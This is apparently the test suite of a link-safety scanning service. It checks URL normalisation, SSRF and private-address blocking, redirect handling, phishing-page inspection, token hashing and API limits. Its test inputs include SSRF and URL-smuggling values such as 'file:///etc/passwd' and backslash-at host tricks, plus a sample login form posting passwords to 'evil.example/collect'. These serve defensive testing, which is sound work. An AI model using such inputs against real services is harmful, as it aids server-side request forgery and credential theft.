from __future__ import annotations

import asyncio
import json
import os
import sqlite3
import stat
import tempfile
import unittest
from contextlib import closing
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import Mock, patch

import dns.exception

from backend.link_safety.api import FixedWindowRateLimiter, create_app
from backend.link_safety.config import PROJECT_ROOT, Settings, load_settings
from backend.link_safety.database import ScanRepository, make_report_credentials, new_scan_id, verify_report_token
from backend.link_safety.errors import AppError, InspectionError, PolicyBlocked
from backend.link_safety.live_checks import (
    _inspect_page, _phishtank, _phishtank_cache, _phishtank_cache_lock, _update,
)
from backend.link_safety.network import (
    SafeResponse,
    _PinnedHTTPConnection,
    follow_redirects,
    is_public_ip,
    request_public,
    resolve_public,
)
from backend.link_safety.url_analysis import analyze_url, finish_assessment, normalize_url


def settings_for(database_path: str) -> Settings:
    return Settings(
        environment="test", bind_address="127.0.0.1", port=38080, database_path=database_path,
        max_body_bytes=8192, max_url_length=4096, rate_limit_window_ms=60000,
        rate_limit_max_requests=20, data_retention_days=30, phishtank_app_key="",
        max_concurrent_scans=2, allowed_hosts=("127.0.0.1", "localhost"), project_root=PROJECT_ROOT,
    )


class UrlPolicyTests(unittest.TestCase):
    def test_flexible_public_suffix_and_normalization(self):
        parsed, host, normalized = normalize_url("HTTPS://Example.Dev/a?b=2#part")
        self.assertEqual(parsed.scheme, "https")
        self.assertEqual(host, "example.dev")
        self.assertEqual(normalized, "https://example.dev/a?b=2#part")

    def test_rejects_private_literal_and_unsafe_url_parts(self):
        for value in (
            "http://127.0.0.1/", "http://10.2.3.4/", "http://[::1]/",
            "https://user:secret@example.com/", "https://example.com:8443/",
            "file:///etc/passwd", "https://bad host.example/", "https://example.com\\@127.0.0.1/",
        ):
            with self.subTest(value=value), self.assertRaises(ValueError):
                normalize_url(value)

    def test_public_ip_classifier_blocks_special_ranges(self):
        for value in (
            "127.0.0.1", "10.0.0.1", "169.254.1.2", "::1", "::ffff:127.0.0.1",
            "64:ff9b::7f00:1", "192.0.2.1", "2002:7f00:1::", "2001:0000:4136:e378:8000:63bf:3fff:fdd2",
        ):
            with self.subTest(value=value):
                self.assertFalse(is_public_ip(value))
        self.assertTrue(is_public_ip("8.8.8.8"))

    def test_rejects_invalid_punycode_without_crashing(self):
        for value in ("https://xn--abc.example/", "https://xn--.example/"):
            with self.subTest(value=value), self.assertRaises(ValueError):
                normalize_url(value)

    def test_accepts_public_ipv6_and_rejects_ambiguous_numeric_hosts(self):
        _parsed, host, normalized = normalize_url("https://[2606:4700:4700::1111]/")
        self.assertEqual(host, "2606:4700:4700::1111")
        self.assertEqual(normalized, "https://[2606:4700:4700::1111]/")
        for value in ("http://127.1/", "http://2130706433/", "http://0177.0.0.1/"):
            with self.subTest(value=value), self.assertRaises(ValueError):
                normalize_url(value)

    def test_assessment_verdict_reflects_unavailable_checks(self):
        analysis = analyze_url("https://example.com")
        for check in analysis["checks"]:
            check["status"] = "clear"
        self.assertEqual(finish_assessment(analysis)["verdict"], "clear")
        analysis["checks"][0]["status"] = "warning"
        self.assertEqual(finish_assessment(analysis)["verdict"], "caution")
        analysis["checks"][0]["status"] = "pending"
        analysis["checks"][1]["status"] = "warning"
        self.assertEqual(finish_assessment(analysis)["verdict"], "caution")


class DatabaseTests(unittest.TestCase):
    def test_migrations_persist_report_atomically_and_hash_token(self):
        with tempfile.TemporaryDirectory() as directory:
            path = str(Path(directory) / "test.sqlite")
            repo = ScanRepository(path, PROJECT_ROOT / "migrations")
            repo.initialize()
            token, token_hash = make_report_credentials()
            report_id = new_scan_id()
            analysis = analyze_url("https://example.com")
            for check in analysis["checks"]:
                check["status"] = "clear"
            record = {
                "id": report_id, "access_token_hash": token_hash, "host": "example.com", "scheme": "https",
                "score": 100, "verdict": "clear", "summary": "No obvious signals.",
                "analyzer_version": "test", "created_at": "2026-11-21T00:00:00Z", "checks": analysis["checks"],
            }
            repo.create(record)
            stored = repo.find_by_id(report_id)
            self.assertIsNotNone(stored)
            self.assertEqual(len(stored["checks"]), len(analysis["checks"]))
            self.assertTrue(verify_report_token(stored["access_token_hash"], token))
            self.assertFalse(verify_report_token(stored["access_token_hash"], "0" * 64))
            with closing(sqlite3.connect(path)) as connection:
                connection.execute("BEGIN")
                schema = connection.execute("SELECT name FROM schema_migrations ORDER BY name").fetchall()
                self.assertEqual([row[0] for row in schema], ["0001_create_scan_records.sql", "0002_allow_live_check_states.sql"])
                saved_token = connection.execute("SELECT access_token_hash FROM scans WHERE id = ?", (report_id,)).fetchone()[0]
                self.assertNotEqual(saved_token, token)

    @unittest.skipIf(os.name == "nt", "POSIX mode bits are not used on Windows")
    def test_database_file_is_created_with_private_permissions(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "private.sqlite"
            repo = ScanRepository(str(path), PROJECT_ROOT / "migrations")
            repo.initialize()
            try:
                self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600)
            finally:
                repo.close()

    def test_memory_database_can_close_from_a_different_worker_thread(self):
        repo = ScanRepository(":memory:", PROJECT_ROOT / "migrations")
        try:
            asyncio.run(asyncio.to_thread(repo.initialize))
            asyncio.run(asyncio.to_thread(repo.ping))
            # A separate asyncio.run call uses another worker thread, mirroring
            # an application lifespan start/stop across a thread pool.
            asyncio.run(asyncio.to_thread(repo.close))
        finally:
            repo.close()


class ConfigurationTests(unittest.TestCase):
    def test_env_file_is_loaded_but_explicit_environment_wins(self):
        with tempfile.TemporaryDirectory() as directory:
            env_file = Path(directory) / ".env"
            env_file.write_text("NODE_ENV=development\nPORT=3456\nRATE_LIMIT_MAX_REQUESTS=9\n", encoding="utf-8")
            settings = load_settings(env_file=env_file, environ={"NODE_ENV": "test", "PORT": "4567"})
        self.assertEqual(settings.environment, "test")
        self.assertEqual(settings.port, 4567)
        self.assertEqual(settings.rate_limit_max_requests, 9)

    def test_empty_database_path_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "DATABASE_PATH"):
            load_settings(environ={"DATABASE_PATH": " "})

    @unittest.skipIf(os.name == "nt", "POSIX symlink behavior is tested on Unix")
    def test_database_path_symlink_is_rejected(self):
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / "target.sqlite"
            target.touch()
            link = Path(directory) / "link.sqlite"
            link.symlink_to(target)
            with self.assertRaisesRegex(ValueError, "symbolic link"):
                load_settings(environ={"DATABASE_PATH": str(link)})


class NetworkPolicyTests(unittest.TestCase):
    def test_dns_resolution_rejects_mixed_public_and_private_answers(self):
        resolver = Mock()
        resolver.resolve.side_effect = [
            [SimpleNamespace(address="8.8.8.8")],
            [SimpleNamespace(address="fd00::1")],
        ]
        with patch("backend.link_safety.network.dns.resolver.Resolver", return_value=resolver):
            with self.assertRaises(PolicyBlocked):
                resolve_public("mixed.example")

    def test_dns_timeout_fails_closed(self):
        resolver = Mock()
        resolver.resolve.side_effect = dns.exception.Timeout
        with patch("backend.link_safety.network.dns.resolver.Resolver", return_value=resolver):
            with self.assertRaises(InspectionError):
                resolve_public("slow.example")

    def test_pinned_connection_uses_the_validated_ip_not_the_hostname(self):
        connection = _PinnedHTTPConnection("example.com", "8.8.8.8", 80, 1.0)
        fake_socket = SimpleNamespace(close=Mock())
        with patch("backend.link_safety.network.socket.create_connection", return_value=fake_socket) as connect:
            connection.connect()
        self.assertEqual(connect.call_args.args[0], ("8.8.8.8", 80))
        connection.close()

    def test_outbound_request_rejects_unsupported_method_and_unbounded_response(self):
        with self.assertRaises(ValueError):
            request_public("https://example.com/", method="DELETE")
        with self.assertRaises(ValueError):
            request_public("https://example.com/", max_bytes=1024 * 1024 + 1)

    def test_outbound_request_rejects_malformed_custom_headers(self):
        with patch("backend.link_safety.network.resolve_public", return_value=[("8.8.8.8", 4)]):
            with self.assertRaises(ValueError):
                request_public("https://example.com/", headers={"Bad Header": "value"})
            with self.assertRaises(ValueError):
                request_public("https://example.com/", headers={"X-Test": "safe\x7funsafe"})

    def test_redirect_to_private_address_is_blocked_before_a_second_request(self):
        first = SafeResponse(302, {"location": "http://127.0.0.1/admin"}, b"", False, "https://example.com/")
        with patch("backend.link_safety.network.request_public", return_value=first) as request:
            with self.assertRaises(PolicyBlocked):
                follow_redirects("https://example.com/")
        request.assert_called_once()

    def test_redirect_history_records_https_downgrade_even_if_it_redirects_back(self):
        responses = [
            SafeResponse(302, {"location": "http://example.com/plain"}, b"", False, "https://example.com/"),
            SafeResponse(302, {"location": "https://example.com/secure"}, b"", False, "http://example.com/plain"),
            SafeResponse(200, {"content-type": "text/html"}, b"ok", False, "https://example.com/secure"),
        ]
        with patch("backend.link_safety.network.request_public", side_effect=responses):
            response, redirects, final_url = follow_redirects("https://example.com/")
        self.assertEqual(response.status, 200)
        self.assertEqual(final_url, "https://example.com/secure")
        self.assertTrue(any(source == "https" and target == "http" for _, _, source, target in redirects))


class HtmlInspectionTests(unittest.TestCase):
    def test_page_parser_checks_external_form_actions_and_https_downgrades(self):
        html = b"<html><head><title>Account login</title></head><body><form action='https://evil.example/collect'><input type='password'></form></body></html>"
        primary = SafeResponse(200, {"content-type": "text/html", "x-frame-options": "DENY"}, html, False, "https://example.com/")
        alternate = SafeResponse(200, {"content-type": "text/html", "x-frame-options": "DENY"}, html, False, "https://example.com/")
        analysis = analyze_url("https://example.com/")
        with patch("backend.link_safety.live_checks.follow_redirects", side_effect=[
            (primary, [("example.com", "example.com", "https", "http")], "https://example.com/"),
            (alternate, [], "https://example.com/"),
        ]):
            _inspect_page("https://example.com/", analysis)
        by_id = {item["id"]: item for item in analysis["checks"]}
        self.assertEqual(by_id["forms"]["status"], "warning")
        self.assertEqual(by_id["formaction"]["status"], "warning")
        self.assertEqual(by_id["tls"]["status"], "warning")

    def test_same_host_https_page_posting_to_http_is_flagged(self):
        html = b"<html><body><form action='http://example.com/submit'><input type='password'></form></body></html>"
        primary = SafeResponse(200, {"content-type": "text/html", "x-frame-options": "DENY"}, html, False, "https://example.com/")
        alternate = SafeResponse(200, {"content-type": "text/html", "x-frame-options": "DENY"}, html, False, "https://example.com/")
        analysis = analyze_url("https://example.com/")
        with patch("backend.link_safety.live_checks.follow_redirects", side_effect=[
            (primary, [], "https://example.com/"), (alternate, [], "https://example.com/"),
        ]):
            _inspect_page("https://example.com/", analysis)
        by_id = {item["id"]: item for item in analysis["checks"]}
        self.assertEqual(by_id["formaction"]["status"], "warning")

    def test_later_success_cannot_erase_a_security_warning(self):
        analysis = analyze_url("https://example.com/")
        _update(analysis, "tls", "warning", "HTTPS downgrade detected.")
        _update(analysis, "tls", "clear", "TLS certificate validated.")
        by_id = {item["id"]: item for item in analysis["checks"]}
        self.assertEqual(by_id["tls"]["status"], "warning")
        self.assertEqual(by_id["tls"]["detail"], "HTTPS downgrade detected.")

    def test_html_to_non_html_user_agent_response_is_not_reported_as_clear(self):
        primary = SafeResponse(200, {"content-type": "text/html; charset=utf-8"}, b"<html><title>Login</title><body>Sign in</body></html>", False, "https://example.com/")
        alternate = SafeResponse(200, {"content-type": "application/json"}, b"{}", False, "https://example.com/")
        analysis = analyze_url("https://example.com/")
        with patch("backend.link_safety.live_checks.follow_redirects", side_effect=[
            (primary, [], "https://example.com/"), (alternate, [], "https://example.com/"),
        ]):
            _inspect_page("https://example.com/", analysis)
        by_id = {item["id"]: item for item in analysis["checks"]}
        self.assertEqual(by_id["cloaking"]["status"], "warning")

    def test_crawler_redirect_to_different_host_is_a_mismatch(self):
        html = b"<html><head><title>Account</title></head><body>Sign in securely</body></html>"
        primary = SafeResponse(200, {"content-type": "text/html", "x-frame-options": "DENY"}, html, False, "https://example.com/")
        alternate = SafeResponse(200, {"content-type": "text/html", "x-frame-options": "DENY"}, html, False, "https://mirror.example/")
        analysis = analyze_url("https://example.com/")
        with patch("backend.link_safety.live_checks.follow_redirects", side_effect=[
            (primary, [], "https://example.com/"), (alternate, [], "https://mirror.example/"),
        ]):
            _inspect_page("https://example.com/", analysis)
        by_id = {item["id"]: item for item in analysis["checks"]}
        self.assertEqual(by_id["cloaking"]["status"], "warning")


class PhishTankTests(unittest.TestCase):
    def tearDown(self):
        with _phishtank_cache_lock:
            _phishtank_cache.clear()

    def test_truncated_provider_response_is_unavailable(self):
        with patch("backend.link_safety.live_checks.request_public", return_value=SafeResponse(
            200, {"content-type": "application/json"}, b'{"results":{}}', True, "https://checkurl.phishtank.com/"
        )):
            with self.assertRaisesRegex(InspectionError, "size limit"):
                _phishtank("https://example.com/", "")

    def test_reputation_cache_is_bounded(self):
        response = SafeResponse(200, {"content-type": "application/json"}, b'{"results":{"in_database":false}}', False, "https://checkurl.phishtank.com/")
        with patch("backend.link_safety.live_checks.request_public", return_value=response):
            for index in range(501):
                _phishtank(f"https://example.com/path-{index}", "")
        with _phishtank_cache_lock:
            self.assertEqual(len(_phishtank_cache), 500)


class RateLimiterTests(unittest.TestCase):
    def test_fixed_window_limit_expires_and_frees_old_entries(self):
        limiter = FixedWindowRateLimiter(window_ms=1000, max_requests=1, max_entries=1)
        limiter.consume("client-a", now=10.0)
        with self.assertRaises(AppError):
            limiter.consume("client-a", now=10.5)
        # Expired state is evicted when a new client arrives at capacity.
        limiter.consume("client-b", now=11.1)
        self.assertIn("client-b", limiter.entries)


async def asgi_request(app, method: str, path: str, body: bytes = b"", headers: dict[str, str] | None = None):
    request_headers = {"host": "127.0.0.1", **(headers or {})}
    messages = []
    sent = False

    async def receive():
        nonlocal sent
        if not sent:
            sent = True
            return {"type": "http.request", "body": body, "more_body": False}
        await asyncio.Event().wait()

    async def send(message):
        messages.append(message)

    scope = {
        "type": "http", "asgi": {"version": "3.0", "spec_version": "2.3"}, "http_version": "1.1",
        "method": method, "scheme": "http", "path": path, "raw_path": path.encode(), "query_string": b"",
        "root_path": "", "headers": [(key.lower().encode(), value.encode()) for key, value in request_headers.items()],
        "client": ("127.0.0.1", 40000), "server": ("127.0.0.1", 38080), "state": {}, "extensions": {},
    }
    await app(scope, receive, send)
    start = next(message for message in messages if message["type"] == "http.response.start")
    payload = b"".join(message.get("body", b"") for message in messages if message["type"] == "http.response.body")
    return start["status"], dict(start["headers"]), payload


class ApiContractTests(unittest.IsolatedAsyncioTestCase):
    async def test_legacy_v1_auth_static_and_request_validation(self):
        with tempfile.TemporaryDirectory() as directory:
            app = create_app(settings_for(str(Path(directory) / "api.sqlite")))
            original_live = "https://example.com"

            async def fake_live(analysis, *, phishtank_app_key=""):
                for check in analysis["checks"]:
                    check["status"] = "clear"
                analysis["score"] = 100
                analysis["verdict"] = "clear"
                analysis["summary"] = "Test screening result."
                return analysis

            with patch("backend.link_safety.api.run_live_checks", fake_live):
                async with app.router.lifespan_context(app):
                    status, headers, payload = await asgi_request(app, "GET", "/")
                    self.assertEqual(status, 200)
                    self.assertIn(b"Link Safety", payload)
                    self.assertEqual(dict(headers).get(b"x-content-type-options"), b"nosniff")

                    status, _headers, payload = await asgi_request(app, "POST", "/api/analyze", json.dumps({"url": original_live}).encode(), {"content-type": "application/json"})
                    self.assertEqual(status, 200)
                    legacy = json.loads(payload)
                    self.assertEqual(legacy["verdict"], "clear")
                    self.assertNotIn("access_token", legacy)

                    status, _headers, payload = await asgi_request(app, "POST", "/api/v1/scans", json.dumps({"url": original_live}).encode(), {"content-type": "application/json"})
                    self.assertEqual(status, 201)
                    saved = json.loads(payload)
                    self.assertNotIn("input", saved)
                    token = saved["access_token"]
                    report_id = saved["scan_id"]

                    status, _headers, payload = await asgi_request(app, "GET", f"/api/v1/scans/{report_id}", headers={"authorization": f"Bearer {token}"})
                    self.assertEqual(status, 200)
                    self.assertEqual(json.loads(payload)["host"], "example.com")

                    status, _headers, _payload = await asgi_request(app, "GET", f"/api/v1/scans/{report_id}", headers={"authorization": "Bearer " + "0" * 64})
                    self.assertEqual(status, 401)

                    status, _headers, payload = await asgi_request(app, "POST", "/api/analyze", b'{"url":"http://127.0.0.1"}', {"content-type": "application/json"})
                    self.assertEqual(status, 400)
                    self.assertIn(b"Only public internet destinations", payload)

                    status, _headers, payload = await asgi_request(app, "POST", "/api/v1/scans", b'{"url":"https://example.com"}', {"content-type": "text/plain"})
                    self.assertEqual(status, 415)
                    self.assertIn(b"UNSUPPORTED_MEDIA_TYPE", payload)

    async def test_request_body_cap_duplicate_keys_and_trusted_host(self):
        with tempfile.TemporaryDirectory() as directory:
            config = replace(settings_for(str(Path(directory) / "api.sqlite")), max_body_bytes=1024)
            app = create_app(config)
            async with app.router.lifespan_context(app):
                oversized = b'{"url":"https://example.com/","padding":"' + (b"x" * 1100) + b'"}'
                status, _headers, _payload = await asgi_request(
                    app, "POST", "/api/analyze", oversized, {"content-type": "application/json"}
                )
                self.assertEqual(status, 413)

                duplicate = b'{"url":"https://example.com/","url":"https://other.example/"}'
                status, _headers, _payload = await asgi_request(
                    app, "POST", "/api/analyze", duplicate, {"content-type": "application/json"}
                )
                self.assertEqual(status, 400)

                status, _headers, _payload = await asgi_request(
                    app, "GET", "/health/live", headers={"host": "attacker.example"}
                )
                self.assertEqual(status, 400)

    async def test_rate_limit_returns_secure_json_response(self):
        with tempfile.TemporaryDirectory() as directory:
            config = replace(settings_for(str(Path(directory) / "api.sqlite")), rate_limit_max_requests=1)
            app = create_app(config)
            async with app.router.lifespan_context(app):
                status, _headers, _payload = await asgi_request(app, "GET", "/health/live")
                self.assertEqual(status, 200)
                status, headers, payload = await asgi_request(app, "GET", "/health/live")
                self.assertEqual(status, 429)
                self.assertIn(b"RATE_LIMITED", payload)
                self.assertIn(b"x-content-type-options", headers)
                self.assertIn(b"x-request-id", headers)


if __name__ == "__main__":
    unittest.main()
